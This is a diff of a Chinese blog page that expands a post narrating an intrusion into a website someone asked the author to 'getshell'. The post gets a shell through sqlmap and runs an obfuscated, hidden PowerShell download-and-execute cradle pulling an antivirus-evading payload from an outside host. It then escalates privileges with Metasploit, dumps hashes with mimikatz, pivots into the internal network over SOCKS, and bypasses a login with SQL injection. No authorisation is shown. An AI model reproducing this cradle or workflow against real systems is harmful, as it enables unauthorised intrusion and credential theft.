@@ -10,7 +10,7 @@
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
     <meta name="description" content="
-有人来找我叫我帮他Getshell
+call：有人来找我叫我帮他Getshell
 
 
 1.Getshell先登上后台看看先，如图：
@@ -19,7 +19,7 @@ yunsee查看一下iis8.5不存在解析漏洞
 
 翻后台找到了一个可以上传html的点，没什么用!后台放弃！
 
-扫描目录发现了网站备份源码！去看看敏感">
+扫描目录发现了网站备份源码！">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -688,6 +688,10 @@ yunsee查看一下iis8.5不存在解析漏洞
                                 <span class="chip bg-color">Getshell</span>
                             </a>
                         
+                            <a href="/tags/内网渗透/" target="_blank">
+                                <span class="chip bg-color">内网渗透</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -722,14 +726,14 @@ yunsee查看一下iis8.5不存在解析漏洞
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        254
+                        1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        3 分
                     </div>
                     
                 
@@ -747,7 +751,7 @@ yunsee查看一下iis8.5不存在解析漏洞
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <blockquote>
-<p>有人来找我叫我帮他<code>Getshell</code></p>
+<p>call：有人来找我叫我帮他<code>Getshell</code></p>
 </blockquote>
 <p><img src="1.png" alt=""></p>
 <h2 id="1-Getshell"><a href="#1-Getshell" class="headerlink" title="1.Getshell"></a>1.Getshell</h2><p>先登上后台看看先，如图：</p>
@@ -765,9 +769,67 @@ yunsee查看一下iis8.5不存在解析漏洞
 <p>那就上<code>sqlmap —os-shell</code>看看吧。</p>
 <p><img src="8.png" alt=""></p>
 <p>普通的权限，上<code>cs</code>操作!</p>
-<pre class=" language-ps"><code class="language-ps">powershell -w hidden -NoExit "$c1='IEX(New-ObjectNet.WebClient).Downlo';$c2='123(''http://x</code></pre>
+<pre class=" language-ps"><code class="language-ps">powershell -w hidden -NoExit "$c1='IEX(New-ObjectNet.WebClient).Downlo';$c2='123(''http://xxxxx/bypass_test.ps1'')'.Replace('123','adString');IEX ($c1+$c2)"
+</code></pre>
 <p>这段ps代码简单混淆了一下，不加<code>-w hidden</code>可以过杀软。</p>
-<p>我这的<code>bypass_test.ps1</code>经过了免杀了（ps免杀的工具，以前APT组织也有在用）。</p>
+<p>我这的<code>bypass_test.ps1</code>经过了免杀了（ps免杀的工具，以前APT组织也有在用）。<br>工具地址在这里：<a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="noopener">传送门！</a></p>
+<p><img src="9.png" alt=""></p>
+<h2 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h2><p><code>cs</code>上线了，先看看系统补丁,如下图：</p>
+<p><img src="10.png" alt=""></p>
+<p>240个补丁，我吐了，各种<code>exp</code>都没用！</p>
+<p>上<code>msf</code>用<code>local_exploit_suggester</code> 让它扫一下看看有没有可以用的漏洞。</p>
+<p>这里直接用<code>cs</code>可以<code>spwn</code>给<code>msf</code> 先去监听那里新建一个。</p>
+<p><img src="11.png" alt=""></p>
+<p>这里要用<code>foreign</code> 然后<code>host</code>用<code>msf</code>的<code>ip</code>，端口就<code>msf</code>监听的端口 我这边直接监听<code>778</code>。</p>
+<p><img src="12.png" alt=""></p>
+<p>然后去<code>msf choose</code>选择刚刚新建的监听。</p>
+<p><img src="13.png" alt=""></p>
+<p><img src="14.png" alt=""></p>
+<p>可以看到这边<code>msf</code>成功上线，然后用<code>local_exploit_suggester</code>扫描一下</p>
+<p><img src="15.png" alt=""></p>
+<p><img src="16.png" alt=""></p>
+<p>成功返回<code>session，getuid</code>查看一下</p>
+<p><img src="17.png" alt=""></p>
+<h2 id="3-读取密码"><a href="#3-读取密码" class="headerlink" title="3.读取密码"></a>3.读取密码</h2><p>直接<code>SYSTEM</code>，拿下，上<code>mimikatz</code>读取一下密码</p>
+<p><img src="18.png" alt=""></p>
+<p>这里发现读取不到，这里是因为<code>2012 R2</code>以上时</p>
+<p>默认禁止在内存缓存中保存明文密码，但是读到了<code>hash</code></p>
+<p><img src="19.png" alt=""></p>
+<h2 id="4-内网渗透"><a href="#4-内网渗透" class="headerlink" title="4.内网渗透"></a>4.内网渗透</h2><p>本来是不打算接着操作的，但是想着都到这步了，就看看吧，哈哈哈哈哈不碍事，之前看过不存在域先用<code>cs</code>弄<code>socks</code>代理。</p>
+<p><img src="19.png" alt=""></p>
+<p>然后用<code>socksCap64</code>来添加代理。</p>
+<p><img src="21.png" alt=""></p>
+<p>然后当然是测试一下连通性咯<del>O(∩_∩)O</del></p>
+<p><img src="22.png" alt=""></p>
+<p>通了就很棒！查看一下<code>ip</code>然后扫一下内网服务。</p>
+<p><img src="23.png" alt=""></p>
+<p><b>子网掩码是255.255.255.240 那就是172.16.0.1/20</b></p>
+<blockquote>
+<p>没有路由交换基础的请去学习！！！至少学完NP,以后我可能也会更新路由交换和TCP/ip的其他东西，路由交换和TCP是最主要的！</p>
+</blockquote>
+<p>我这里用<code>御剑</code>的端口扫描，线程不能开太高容易死，就扫<code>80</code>端口先(要在刚刚的<code>sockscap64</code>里面添加然后在里面运行才行)</p>
+<p><img src="24.png" alt=""></p>
+<p>扫出来了很多的<code>80</code>，导出来之后用<code>test404</code>的<code>title</code>获取,来获取一下网站的标题再来选目标。</p>
+<p><img src="25.png" alt=""></p>
+<p>看到了一个管理系统，然后去firefox（火狐挺好用的）打开用代理设置一下。</p>
+<p><img src="26.png" alt=""></p>
+<p>设置好之后就可以去访问了。</p>
+<p><img src="27.png" alt=""></p>
+<p>可以看到是个登陆的页面，可以尝试一下弱口令，</p>
+<p><img src="28.png" alt=""></p>
+<p>错误，但是发现了是<code>thinkphp</code>的框架，尝试使用<code>rce</code>。</p>
+<p><img src="29.png" alt=""></p>
+<p><code>rce</code>尝试无果，发现是<code>phpstudy</code>，尝试<code>phpmyadmin</code>发现不存在!</p>
+<p>尝试使用<code>phpstudy rce</code>吧!</p>
+<p><img src="30.png" alt=""></p>
+<p><code>rce</code>无果，尝试<code>注入</code>吧~ε=(´ο｀*)))唉</p>
+<p><img src="31.png" alt=""></p>
+<p>哎嘿嘿~存在<code>注入</code>，尝试万能密码 <code>admin’ #</code></p>
+<p><img src="32.png" alt=""></p>
+<p>直接进来了，后面<code>getshell</code>没法绕过上传，放弃了，内网就到这吧，其他就不弄了~</p>
+<h2 id="最后总结一下吧"><a href="#最后总结一下吧" class="headerlink" title="最后总结一下吧"></a>最后总结一下吧</h2><p>之前提权弄了半天都没弄下来，然后找了位表哥帮忙提权了~</p>
+<p>(其实之前就想到过要用这个扫描，但是懒得传msf，果然就是懒限制了我的操作)</p>
+<p>内网思路的一些分享：注入登录的验证码是可以重复使用的，在不存在注入的情况下，其实可以<code>爆破</code>的。<br>内网渗透发现不存在域就扫一下内网其他机器的常见端口<code>80,445,1433,3306,3389,6379</code>等常见的端口，然后再进行渗透。</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -1150,7 +1212,7 @@ yunsee查看一下iis8.5不存在解析漏洞
                     <div class="summary block-with-text">
                         
                             
-有人来找我叫我帮他Getshell
+call：有人来找我叫我帮他Getshell
 
 
 1.Getshell先登上后台看看先，如图：
@@ -1159,7 +1221,7 @@ yunsee查看一下iis8.5不存在解析漏洞
 
 翻后台找到了一个可以上传html的点，没什么用!后台放弃！
 
-扫描目录发现了网站备份源码！去看看敏感
+扫描目录发现了网站备份源码！
                         
                     </div>
                     <div class="publish-info">
@@ -1204,6 +1266,10 @@ yunsee查看一下iis8.5不存在解析漏洞
                     
                     <a href="/tags/Getshell/" target="_blank">
                         <span class="chip bg-color">Getshell</span>
+                    </a>
+                    
+                    <a href="/tags/内网渗透/" target="_blank">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
@@ -1458,7 +1524,7 @@ yunsee查看一下iis8.5不存在解析漏洞
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">4.1k</span> 字
+                <span class="white-color">4.8k</span> 字
             
 
             
